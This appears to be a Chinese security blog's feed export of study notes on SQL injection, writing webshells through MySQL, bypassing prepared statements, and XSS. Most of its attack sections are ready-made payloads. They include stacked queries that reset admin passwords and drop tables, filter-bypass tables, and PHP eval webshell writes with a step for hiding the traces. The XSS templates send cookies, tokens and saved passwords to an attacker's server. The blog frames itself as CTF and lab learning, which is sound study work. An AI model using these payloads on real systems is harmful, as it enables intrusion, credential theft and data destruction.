注入模板-- ===== 报错注入（PROCEDURE ANALYSE） =====-- 查库名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--+-- 查表名?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)--+-- 显示不全?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32))),1)--+-- ===== 联合注入（后面无 ORDER BY 时） =====?page=1 UNION SELECT 1,2,3--+-- ===== 时间盲注 =====?page=1 and sleep(5)--+


过滤绕过速查


过滤
绕过
示例



逗号 ,
OFFSET 语法
LIMIT 10 OFFSET 1


数字
运算代替
1+1 2*1


PROCEDURE
换 UNION 或盲注
换注入方式



6. IN 注入原理：IN (...) 括号内参数用户可控，直接拼接。
代码特征：参数在 IN (...) 括号内。
$sql = &quot;SELECT * FROM users WHERE id IN (&#123;$_GET[&#x27;ids&#x27;]&#125;)&quot;;

危险函数：
mysqli_query($conn, $sql)


注入模板-- ① 闭合测试?ids=1) and 1=1--+-- ② 查库名?ids=1) and 1=2 union select 1,database(),3--+-- ③ 查表名?ids=1) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名?ids=1) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;表名&#x27;--+-- ⑤ 拿数据?ids=1) and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+


过滤绕过速查


过滤
绕过
说明



逗号
UNION 逐行查
不用 group_concat


括号
OR 条件代替
id=1 OR 1=2 UNION SELECT...


空格&#x2F;关键字
同数字型
双写、大小写



7. INSERT &#x2F; UPDATE &#x2F; DELETE 注入原理：增删改语句中存在注入，通常用报错注入或时间盲注。
代码特征：INSERT &#x2F; UPDATE &#x2F; DELETE 语句中直接拼接用户输入。
// INSERT$sql = &quot;INSERT INTO users(username,password) VALUES (&#x27;&#123;$_POST[&#x27;user&#x27;]&#125;&#x27;,&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27;)&quot;;// UPDATE$sql = &quot;UPDATE users SET password=&#x27;&#123;$_POST[&#x27;pass&#x27;]&#125;&#x27; WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;// DELETE$sql = &quot;DELETE FROM users WHERE id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;

危险函数：
mysqli_query($conn, $sql)mysqli_multi_query($conn, $sql)   // 支持堆叠


注入模板-- ===== 报错注入（首选） =====-- 查库名username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- 查表名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#-- 查列名username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e),1)#-- 拿数据username=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)#-- 显示不全username=admin&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)#-- ===== 时间盲注（无报错时用） =====username=admin&#x27; and if(1=1,sleep(5),0)#


过滤绕过速查同字符型注入。重点：单引号→宽字节&#x2F;十六进制，关键字→双写&#x2F;大小写，updatexml→extractvalue&#x2F;floor。

8. 堆叠注入原理：数据库支持多语句执行，用 ; 分隔执行多条 SQL。
代码特征：使用支持多语句执行的函数。
mysqli_multi_query($conn, $sql);

PDO 默认不支持，需 PDO::ATTR_EMULATE_PREPARES =&gt; true。
危险函数：
mysqli_multi_query($conn, $sql)


注入模板-- 查库?id=1;show databases;-- 查表?id=1;use 库名;show tables;-- 查当前库的表1&#x27;;show tables;-- 查列?id=1;show columns from 表名;?id=1;use 库名;show columns from 表名;-- 查内容（handler 绕过 select 过滤）?id=1;use 库名;handler 表名 open;handler 表名 read first;-- 改数据（最常用）?id=1;update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;-- 删数据?id=1;delete from users where id=1;-- 删表?id=1;drop table 表名;-- 查当前用户/版本?id=1;select user();?id=1;select version();


过滤绕过速查


过滤
绕过
说明



分号 ;
过滤了就没了，换报错&#x2F;盲注
堆叠全靠分号


select
用 show 代替查tables
show tables


select
handler  查内容
handler 表名 open;handler 表名 read first;



9. 二次注入原理：输入入库时转义了，出库取出后直接拼 SQL，反斜杠消失，触发注入。
代码特征：入库有过滤，出库直接拼 SQL。
// 入库时转义（看似安全）$username = addslashes($_POST[&#x27;username&#x27;]);$sql = &quot;INSERT INTO users(username) VALUES (&#x27;$username&#x27;)&quot;;// 出库时直接拼（实际危险）$row = mysqli_fetch_assoc($result);$sql2 = &quot;SELECT * FROM users WHERE username = &#x27;&#123;$row[&#x27;username&#x27;]&#125;&#x27;&quot;;

危险函数：
addslashes()          // 入库时用的，出库后反斜杠没了mysqli_query()        // 出库后拼 SQL 执行


注入模板-- ===== 第一步：注册带注入的账号 =====username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456-- ===== 第二步：触发注入（登录/修改密码/查询等） =====-- 用刚才注册的账号登录，出库时拼 SQL 自动触发username=admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#password=123456


触发点取决于业务：修改密码、个人信息查询、留言展示等，只要从数据库取出来拼 SQL 的地方都能触发。


过滤绕过速查


过滤
绕过
说明



入库 addslashes
没用，出库反斜杠就没了
二次注入核心就是绕这个


出库也转义
那就安全了
但很少有开发这么做


关键字过滤
同字符型绕过
双写、大小写



10. Cookie &#x2F; Header 注入原理：注入点在 Cookie 或 HTTP 请求头中，开发只过滤了 GET&#x2F;POST。
代码特征：参数来源是 $_COOKIE 或 $_SERVER。
// Cookie 注入$id = $_COOKIE[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;// UA 注入$ua = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$sql = &quot;INSERT INTO log(ua) VALUES (&#x27;$ua&#x27;)&quot;;// XFF 注入$ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];$sql = &quot;INSERT INTO log(ip) VALUES (&#x27;$ip&#x27;)&quot;;

危险函数：
mysqli_query($conn, $sql)


注入模板-- ===== Cookie 注入 =====Cookie: id=1 and 1=2 union select 1,database(),3--+-- ===== UA 注入 =====User-Agent: &#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== X-Forwarded-For 注入 =====X-Forwarded-For: 127.0.0.1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#-- ===== Referer 注入 =====Referer: &#x27; and 1=2 union select 1,database(),3--+


过滤绕过速查


过滤
绕过
说明



只过滤 GET&#x2F;POST
换 Cookie&#x2F;Header 注入
审计最容易漏的地方


IP 格式校验
XFF 多个 IP 逗号分隔
127.0.0.1, &#39;注入语句&#39;


Cookie 编码
URL 编码后再传
看后端有没有 urldecode



11. 宽字节注入原理：数据库用 GBK 等宽字节编码，addslashes() 转义的 \&#39; 被 %df 吃掉变成汉字，单引号逃逸。
代码特征：有转义 + 数据库宽字节编码 + 没设正确连接字符集。
$id = addslashes($_GET[&#x27;id&#x27;]);$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;// 数据库字符集：GBK / gbk / gb2312

危险函数：
addslashes()                      // 转义函数mysql_query() / mysqli_query()    // 执行 SQL


注入模板-- ① 测试闭合?id=1%df&#x27; and 1=1--+?id=1%df&#x27; and 1=2--+-- ② 查库名?id=-1%df&#x27; union select 1,database(),3--+-- ③ 查表名?id=-1%df&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+-- ④ 查列名（表名用十六进制，避免单引号）?id=-1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+-- ⑤ 拿数据?id=-1%df&#x27; union select 1,group_concat(username,0x3a,password),3 from users--+-- ⑥ 显示不全?id=-1%df&#x27; union select 1,substr(group_concat(flag),1,32),3 from flag--+


过滤绕过速查


过滤
绕过
说明



addslashes()
%df&#39; 宽字节
核心绕过方式


mysql_real_escape_string()
没设 mysql_set_charset(&#39;gbk&#39;) 也能绕
设了就安全了


单引号
十六进制字符串
table_name=0x7573657273


空格&#x2F;关键字
同字符型
双写、大小写



附录：黑名单函数替代速查表


被过滤
替代方案



updatexml
extractvalue() floor() exp()


extractvalue
updatexml() floor()


floor
updatexml() extractvalue()


sleep
benchmark(10000000,md5(1))


if
case when ... then ... end elt() field()


substr
mid() substring() left() right()


group_concat
concat_ws() + limit 逐行


concat
concat_ws() group_concat()


union select
报错注入、盲注、/*!union*/ /*!select*/


information_schema
sys.schema_auto_increment_columns mysql.innodb_table_stats


and
&amp;&amp; anAndd 双写


or
oorr 双写


select
大小写 SeLeCt 双写 selselectect


from
双写 frfromom


where
双写 whwhereere


order by
group by


空格
/**/ %09 %0a %0d %a0 括号 ()


逗号 ,
from x for y join offset


等号 &#x3D;
like regexp &gt; &lt; !=


注释 # –
;%00 /*...*/


单引号 ‘
宽字节 %df&#39; 十六进制 0x...


百分号 %
_ 匹配单字符


limit
limit 1 offset 0



审计速记口诀
找输入 → 找 SQL → 看拼接 → 判类型 → 测过滤 → 选姿势
有回显用联合，有报错用报错，都没有用盲注
90% 的注入出在 order by、like、in、数字型无过滤这四个地方

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 注入写 shell</title>
    <url>/2026/08/14/sql-injection-write-shell/</url>
    <content><![CDATA[通过 MySQL 写入 WebShell 是一种常见的安全测试技术，通常需要特定权限和配置。
方法 1：使用 OUTFILE 写入 Shell原理：把 SELECT 查询结果写入文件。
条件：
数据库用户具有 FILE 权限。
知道目标网站的绝对路径，并且该路径具有写入权限。
secure_file_priv 参数未限制写入路径。

执行以下 SQL 语句，将一句话木马写入文件：
SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; INTO OUTFILE &#x27;C:/phpStudy/WWW/shell.php&#x27;;

验证文件是否成功写入，并通过 Web 访问测试。
注意：OUTFILE 会在每行末尾添加换行符，适合写文本文件。
如果路径受限，可尝试修改 MySQL 配置文件中的 secure_file_priv 参数。
方法 2：利用全局日志写入 Shell原理：开启 MySQL 通用日志（general log），把日志文件路径改成网站目录下的 .php，然后执行一句带木马的 SQL，日志里就有木马了。
步骤：检查全局日志是否开启：
SHOW VARIABLES LIKE &#x27;%general_log%&#x27;;

开启全局日志并设置日志路径为目标目录：
SET GLOBAL general_log = &#x27;ON&#x27;;SET GLOBAL general_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;

执行一条包含 WebShell 的查询语句：
SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;;

恢复原始日志配置以避免被发现：
SET GLOBAL general_log = &#x27;OFF&#x27;;

方法 3：通过慢查询日志写入 Shell步骤：检查慢查询日志是否开启：
SHOW VARIABLES LIKE &#x27;%slow_query_log%&#x27;;

开启慢查询日志并设置日志路径：
SET GLOBAL slow_query_log = &#x27;ON&#x27;;SET GLOBAL slow_query_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;

执行一条耗时查询并注入 WebShell：
SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; OR SLEEP(11);

验证文件是否成功生成，并关闭慢查询日志。
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 预编译及绕过</title>
    <url>/2026/08/14/sql-prepared-statement-bypass/</url>
    <content><![CDATA[预编译与sql注入，正则回溯绕过，mysql常见绕过，报错注入7大常用函数 - 技术栈
预编译的基础原理与作用1. 为什么预编译能防御SQL注入？假设有一个使用SQL预编译的查询语句：
String query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;PreparedStatement pstmt = connection.prepareStatement(query);pstmt.setString(1, username);pstmt.setString(2, password);ResultSet rs = pstmt.executeQuery();

在这个示例中，查询语句中的参数使用了占位符，即“?”号，而不是将参数直接拼接到SQL语句中。这可以有效地防止SQL注入攻击。
SQL注入的核心原因在于：数据库将用户的输入当成了可执行的SQL代码的一部分。
普通查询：直接拼接字符串。如果用户输入 1 union select...，数据库会将其解析为两条指令。
预编译：将SQL语句的结构与数据分离。

预处理：数据库先接收带有占位符（如 ?）的SQL模板，进行语法检查、解析并生成执行计划（语法树）。此时数据库已经确定了”这句话是干什么用的”（例如查询id为X的用户）。
执行：用户输入的数据作为纯数据填充到占位符中。无论输入什么内容，数据库都只把它当作数据，而不会改变之前生成的SQL结构。

结论：预编译消除了SQL语句的歧义。
2. 预编译的初衷是什么？预编译最初的目的是为了”性能优化”，而不是为了安全。
如果大量执行相同的SQL语句，预编译可以复用执行计划（语法树），避免重复解析，提高效率。
防御SQL注入只是其副产品。
“真”预编译与”假”预编译（PHP PDO为例）强调一个在渗透测试和代码审计中非常重要的概念：”模拟预编译”。

PHP PDO（PHP Data Objects） 是一种轻量级的数据库抽象层，为开发者提供了统一的接口来访问多种数据库。通过 PDO，开发者可以在不修改代码逻辑的情况下切换数据库类型，例如 MySQL、PostgreSQL、SQLite 等。

1. 虚假的预编译机制：当使用PHP PDO时，默认配置 PDO::ATTR_EMULATE_PREPARES为 true。
过程：程序并没有真正将SQL模板发给数据库。而是在本地（客户端）将参数值进行转义（自动加引号、转义符号），然后拼接成完整的SQL语句，再发给数据库执行。
日志特征：数据库日志中只看到 Query语句，没有 Prepare和 Execute 的分步过程。
风险：本质上只是做了自动转义，和addslashes类似。

addslashes 是 PHP 中的一个函数，用于在字符串中的预定义字符前添加反斜杠。这些预定义字符包括单引号 (‘)、双引号 (“)、反斜杠 () 和 NULL 字符。

宽字节注入：在特定编码（如GBK）环境下，理论上可能通过构造字符吞掉转义符（\）来实现注入。
安全性不如真预编译。
2. 真正的预编译机制：设置 PDO::ATTR_EMULATE_PREPARES 为 false。
过程：

客户端发送带 ?的模板给DB -&gt; Prepare。
DB解析并构建语法树。
客户端发送参数值给DB -&gt; Execute。

日志特征：日志清晰显示 Prepare 和 Execute 分开执行。
安全性：参数值在底层被转为十六进制（Hex）发送，彻底隔绝了SQL注入的可能性（仅限可参数化位置）
预编译的注入点：不可参数化的位置预编译只能防御数据值的注入，无法防御结构位置的注入。
1. 哪些位置不可参数化？由于数据库的设计，预编译绑定参数时，必须会给参数加上单引号，且参数被视为数据值。但以下位置必须要是”裸”的（不带引号），否则SQL语法错误或逻辑错误：

表名
列名
Order By &#x2F; Group By 后的字段
Limit 后的数字
Join 条件

2. 为什么 Order By 不可预编译？如果强行使用预编译，SQL会变成 SELECT * FROM table ORDER BY &#39;column_name&#39;。
加上引号后，数据库将其视为一个”字符串常量”，而不是列名。这会导致排序失效（等同于 ORDER BY NULL或随机排序）。
因此，开发者不得不使用字符串拼接 ORDER BY $col，这就导致了SQL注入漏洞。
3. 如何利用 Order By 进行盲注？如果遇到 Order By 后可控，可以利用报错注入或布尔盲注。
布尔盲注原理：利用 ORDER BY 配合条件判断，不同的真值会导致排序结果不同。
Payload示例：
SELECT * FROM users ORDER BY rand(ascii(mid((select database()),1,1))&gt;96)

如果 &gt;96 为真，rand(1) 是一个固定值；如果为假，rand(0) 是另一个固定值。观察返回结果的行顺序变化即可以此一位位猜解数据。
深入底层：为什么无法设计”安全预编译”？无法简单地通过修改代码来让所有位置都支持预编译。
1. 性能与执行计划数据库优化器在生成执行计划时，需要知道具体的表名、列名才能决定使用哪个索引。
WHERE username = ? 无论填什么值，执行计划可能是一样的（比如用username的索引）。
ORDER BY ? 如果 ? 是 id 用索引A，如果是 create_time 用索引B。参数会影响结构，导致无法复用预编译的执行计划。
2. 协议层面的真相通过抓包分析 Web 服务与数据库的二进制协议通信，发现：
预编译的参数在传输时并不是带着”引号“过去的，而是通过二进制协议的类型标识来区分是整数还是字符串。
数据库日志里显示的引号，是 MySQL 为了日志可读性自己加的显示格式。
既然是数据库底层协议规定了占位符只能传数据，那么应用层（PHP&#x2F;Java&#x2F;Go）无法单方面改变这个限制。
所以说，有的引号就是加不了，所以不保证所有的预编译都是安全的
终极绕过：协议层SQL注入
1. 预编译防御的边界预编译解决了”代码与数据混淆”的问题，也就是解决了 Web服务 -&gt; 数据库 这个过程中，用户输入被错误解析为SQL代码的问题。
但是，预编译没有解决 Web服务 -&gt; 数据库 这个通信过程本身被篡改的问题。
2. 二进制协议溢出攻击 (CVE-2024-27304)原理：
Web服务构造数据库协议包：_Type_:_Execute_ _Length_:4字节 _Value_:_SQL_数据。
Length 字段（4字节）最大支持 0xFFFFFFFF (4GB)。
如果攻击者发送一个超长的输入（或者利用某些压缩特性），导致 Length 计算发生”整数溢出“。
例如溢出后 Length 变成了 0 或一个很小的值。
数据库解析时，只读取了很小的长度作为 SQL 语句，而原本后面的数据被”截断”在协议流中。
攻击效果：
攻击者精心构造输入，使得截断后剩下的二进制数据恰好组成了一个新的、合法的协议包（例如 Query: DROP TABLE users）。
数据库继续读取流，执行了这个被”走私”进来的恶意SQL语句。
结论：这种攻击完全无视应用层是否使用了预编译，因为它发生在协议解析层面。
一句话总结：预编译会消除sql注入误解但是无法消除注入本身，注入的语句本身依旧会在web服务-&gt;数据库 阶段执行，可通过底层二进制协议溢出的方式走私恶意代码
注：在 Windows 中文系统下，PHP 通过命令行执行命令成功但没有正确回显输出，核心原因可能是字符编码不匹配（Windows 默认是 GBK&#x2F;GB2312，而 PHP 默认用 UTF-8）导致的乱码或无输出。
解决方法：
核心原因 ：
Windows 中文系统命令行输出是 GBK 编码，PHP 默认 UTF-8，编码不匹配导致无回显 &#x2F; 乱码；
快速解决 ：执行命令前加chcp 936，并将输出用mb_convert_encoding转为 UTF-8；
全局解决 ：修改php.ini配置开启 mbstring 扩展，设置默认编码为 UTF-8。

SQL预编译的绕过方法！！！！！字符串拼接：如果在SQL预编译语句中使用了字符串拼接，攻击者可以通过构造特定的字符串来绕过预编译过程。
漏洞代码 :
&lt;?php// 看似用了预编译，但表名/列名直接拼接了$id = $_GET[&#x27;id&#x27;];$table = $_GET[&#x27;table&#x27;];  // 用户可控的表名$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root&quot;);// ❌ 错误：表名直接拼接，预编译只防了 id 的值$sql = &quot;SELECT * FROM $table WHERE id = ?&quot;;$stmt = $pdo-&gt;prepare($sql);$stmt-&gt;execute([$id]);$result = $stmt-&gt;fetchAll();print_r($result);?&gt;

POC :
?id=1&amp;table=users where 1=2 union select 1,version(),3--+

动态拼接SQL语句：如果动态地拼接SQL语句，例如使用字符串拼接、字符串格式化等方式，攻击者同样可以利用字符串的特性来绕过预编译过程。
漏洞代码 :
&lt;?php// 用字符串格式化动态生成整个 SQL$id = $_GET[&#x27;id&#x27;];$column = $_GET[&#x27;column&#x27;];  // 用户可控的列名$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root&quot;);// ❌ 错误：列名用 sprintf 拼进去了$sql = sprintf(&quot;SELECT %s FROM users WHERE id = ?&quot;, $column);$stmt = $pdo-&gt;prepare($sql);$stmt-&gt;execute([$id]);$result = $stmt-&gt;fetchAll();print_r($result);?&gt;

POC:
?id=1&amp;column=version() from users where 1=2 union select flag--+

函数 &#x2F; 存储过程绕过:如果在SQL语句中使用了函数或存储过程，攻击者可以构造恶意的输入，使其执行预期之外的操作，绕过预编译过程。
-- 创建存储过程DELIMITER //CREATE PROCEDURE getUser(IN username VARCHAR(50))BEGIN    -- ❌ 存储过程内部直接拼接，存在注入    SET @sql = CONCAT(&#x27;SELECT * FROM users WHERE username = &#x27;&#x27;&#x27;, username, &#x27;&#x27;&#x27;&#x27;);    PREPARE stmt FROM @sql;    EXECUTE stmt;    DEALLOCATE PREPARE stmt;END //DELIMITER ;

&lt;?php// PHP 端看似用了预编译调用存储过程$user = $_GET[&#x27;user&#x27;];$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root&quot;);// ✅ PHP 端用了预编译$stmt = $pdo-&gt;prepare(&quot;CALL getUser(?)&quot;);$stmt-&gt;execute([$user]);$result = $stmt-&gt;fetchAll();print_r($result);?&gt;

POC：
?user=admin&#x27; AND extractvalue(1,concat(0x7e,version(),0x7e)) AND &#x27;1&#x27;=&#x27;1

错误处理不当：如果SQL预编译过程中的错误处理不当，例如忽略异常或者异常处理不当，攻击者可能会通过特定的输入来触发错误，绕过预编译过程。
漏洞代码：
&lt;?php$id = $_GET[&#x27;id&#x27;];$pdo = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root&quot;);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);try &#123;    $sql = &quot;SELECT * FROM users WHERE id = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;execute([$id]);&#125; catch (Exception $e) &#123;    // ❌ 错误：直接把异常信息输出到页面    echo &quot;错误：&quot; . $e-&gt;getMessage();&#125;?&gt;

POC（报错注入）:
?id=1 AND extractvalue(1,concat(0x7e,version(),0x7e))

一句话总结:预编译只防 “值” 的注入，不防 “结构” 的注入。只要 SQL 模板本身是用户可控的（表名、列名、ORDER BY、存储过程内部拼接），预编译就形同虚设。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>预编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全笔记写作模板</title>
    <url>/2026/08/14/web-security-notes-template/</url>
    <content><![CDATA[
这是一篇示例文章，展示 Web 安全笔记的推荐写法。

漏洞概述一句话说明这个漏洞是什么。
漏洞原理详细讲解漏洞成因，配图或代码。
&lt;?php$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;?&gt;

漏洞复现环境准备利用步骤payload 示例

防御方案
方案一
方案二
方案三

参考资料
OWASP

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>模板</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎来到我的安全博客</title>
    <url>/2026/08/14/welcome-to-my-blog/</url>
    <content><![CDATA[博客定位你好，欢迎来到我的安全博客 👋
这里是我的 网络安全学习笔记，主要用于记录我在 Web 安全、渗透测试、CTF 比赛和靶场练习中的所学所思。
内容分类


分类
内容



Web安全
各类 Web 漏洞的原理、利用与防御


渗透测试
实战渗透流程、工具使用、思路总结


CTF
比赛 Writeup、解题复盘


靶场
DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB 等通关笔记


写作规范
所有文章均遵循「原理 → 复现 → 防御」的结构
靶场与比赛文章请务必标注目标来源与授权范围
文章仅供学习交流，请勿用于非法用途

联系我
GitHub：Echoin-613


道阻且长，行则将至。一起加油 💪

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>说明</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS 跨站脚本攻击</title>
    <url>/2026/08/14/xss/</url>
    <content><![CDATA[1. 一句话本质用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。

CTF 识别信号：源码里出现 bot &#x2F; puppeteer &#x2F; headless &#x2F; chromium 关键词 → 99% 考 XSS。bot 的作用就是模拟管理员访问页面，触发你的 XSS。
外带 &#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的数据，当成一个「请求」发到你自己的服务器上。

2. 代码特征（看到&#x3D;有洞）特征 A：后端输出到 HTML 没转义


危险写法
说明



&#96;{{ x
safe }}&#96;


{% autoescape false %}
整块关转义


render_template_string(f&quot;...{u}&quot;)
字符串拼接模板


echo $GET[&#39;x&#39;]（PHP）
直接输出


&lt;%= param %&gt;（JSP）
直接输出


手拼 HTML 字符串再输出
无转义


特征 B：前端把数据塞进「能执行 &#x2F; 能解析 HTML」的 API
解析 HTML：innerHTML &#x2F; outerHTML &#x2F; document.write &#x2F; insertAdjacentHTML &#x2F; jQuery .html() &#x2F; Vue v-html &#x2F; React dangerouslySetInnerHTML
执行字符串：eval() &#x2F; Function() &#x2F; setTimeout(&quot;str&quot;) &#x2F; setInterval(&quot;str&quot;)
跳转&#x2F;加载：location.href= &#x2F; location.replace() &#x2F; window.open() &#x2F; iframe.src=
安全对照：textContent &#x2F; .text()

特征 C：三个助推漏洞
无 CSP，或 script-src &#39;unsafe-inline&#39;
Cookie 无 HttpOnly（XSS 可偷 session）
只过滤不转义（过滤可绕过：大小写&#x2F;编码&#x2F;双写）

容易漏的 sink
javascript: 伪协议（&lt;a href&gt;、&lt;img src&gt;、&lt;iframe src&gt;）
srcdoc、&lt;meta http-equiv=&quot;refresh&quot;&gt;、&lt;object data&gt;、&lt;embed src&gt;
postMessage 的 onmessage 回调里直接 innerHTML &#x2F; eval（payload 不进服务端日志）
CSS style 属性 &#x2F; &lt;style&gt; 里的 expression()

3. 审计路径（source→sink）
找 Sink（出口）：grep innerHTML &#x2F; document.write &#x2F; eval &#x2F; |safe &#x2F; echo $
追 Source：数据来自 URL 参数 &#x2F; 表单 &#x2F; Cookie &#x2F; 存储（数据库）？
判定：Source 可控（用户输入）+ Sink 未转义 → 漏洞成立


存储型 XSS 是跨文件污点追踪：输入 → [存库代码] → 数据库 → [渲染代码] → 浏览器。要同时盯写库和渲染两端——很多项目写库时过滤了、渲染时没转义，或反之；只要一端不设防即可利用。

4. 白盒验证
追数据流：确认 source 可控、sink 未转义
查兜底：是否有 CSP &#x2F; 全局过滤 &#x2F; sanitizer
确认注入点上下文（HTML 内容区 &#x2F; 属性值 &#x2F; script 内）→ 决定 payload 写法

5. 黑盒验证① 输入 &#39;&quot;&gt;&lt;svg onload=alert(1)&gt;② 查看源码：输入出现在哪？被转义了吗？③ 按回显位置换 payload：



回显位置
payload



直接出现在 HTML 内容区
&lt;img src=x onerror=alert(1)&gt;


出现在 value=&quot;★&quot; 里
&quot;&gt;&lt;img src=x onerror=alert(1)&gt;


出现在 &lt;script&gt;var x=&#39;★&#39;&lt;/script&gt;
&#39;;alert(1);//


出现在 &lt;a href=&quot;★&quot;&gt;
javascript:alert(1)


被转义成 &amp;lt;
尝试解码绕过（编码&#x2F;大小写&#x2F;双写）


④ 弹了 → 判断反射&#x2F;存储 → 换成外带版
6. 利用与打法


类型
数据路径
特点



反射型
输入→服务器→原样响应→浏览器执行
不存储，需受害者点链接（CTF 配 bot）


存储型
输入→存库→渲染→浏览器
永久存储，bot 正常访问就被打，危害最大


DOM XSS
URL 参数&#x2F;hash→前端 JS→写 DOM
不经过服务器拼接，payload 不在响应 HTML 里


外带思路：让 bot 的浏览器（admin 会话）把读到的数据发到你的 VPS：触发 XSS → fetch 目标数据 → new Image().src=你的VPS → VPS 解码
7. Payload 模板通用外带（一步）&lt;script&gt;fetch(&quot;目标URL&quot;).then(r=&gt;r.text()).then(t=&gt;&#123;  new Image().src=&quot;http://你的VPS:8080/?d=&quot;+encodeURIComponent(t);&#125;);&lt;/script&gt;

通用外带（两步：先拿 ID 再读详情）&lt;script&gt;fetch(&quot;列表页URL&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;  let id=h.split(&quot;分隔符&quot;)[1].substring(0,ID长度);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;

遍历多个 ID&lt;script&gt;t.split(&quot;分隔符&quot;).slice(1).forEach(p=&gt;&#123;  let id=p.substring(0,40);  fetch(&quot;详情页URL&quot;+id).then(r=&gt;r.text()).then(t=&gt;&#123;    new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(t);  &#125;);&#125;);&lt;/script&gt;

读什么数据的变体


目标
代码



页面文本
fetch(url).then(r=&gt;r.text())


JSON 接口
fetch(url).then(r=&gt;r.text())（text 够用）


Cookie
new Image().src=&quot;http://VPS:8080/?d=&quot;+encodeURIComponent(document.cookie)


localStorage
...encodeURIComponent(localStorage.getItem(&quot;token&quot;))


整份 DOM
...encodeURIComponent(document.documentElement.outerHTML)


自动填充密码
...document.querySelector(&quot;input[type=password]&quot;).value


当前页 URL
...location.href


注入点特殊情况


情况
约束
对策



A：二次转义（repr&#x2F;JSON）
禁单引号、禁反斜杠
payload 全用双引号；用 h.split(&quot;/s/&quot;)[1] 不用正则


B：HTML 属性里
不能有 &quot;（会闭合属性）
用 &amp;#39;/&amp;quot; 或反引号，payload 用 &#39;...&#39;


C：&lt;script&gt; 标签内
防 &lt;/script&gt; 提前闭合
&lt;/script&gt;&lt;script&gt;fetch(...)&lt;/script&gt;


服务器监听python3 -m http.server 8080

8. 绕过


被过滤的东西
绕过



空格（属性分隔）
&lt;script&gt;alert(1)&lt;/script&gt;（标签内直接写 JS）；&lt;svg onload&gt;、&lt;details open ontoggle&gt;


点号（属性访问）
fetch(&quot;/&quot;)[&quot;then&quot;](function(r){return r[&quot;text&quot;]()})


单引号
改用双引号 fetch(&quot;/&quot;)


URL 中的点号
十六进制 IP：http://192.168.1.100 → http://0xc0a80164


return 后需要空格
return(fetch(&quot;/&quot;))；箭头函数 r=&gt;r[&quot;text&quot;]()


标签被过滤
换标签&#x2F;事件：&lt;svg onload&gt;、&lt;img src=x onerror&gt;、&lt;details open ontoggle&gt;


大小写过滤
&lt;ScRiPt&gt;、JaVaScRiPt:


javascript: 被滤
java\nscript:、HTML 实体 &amp;#106;avascript:


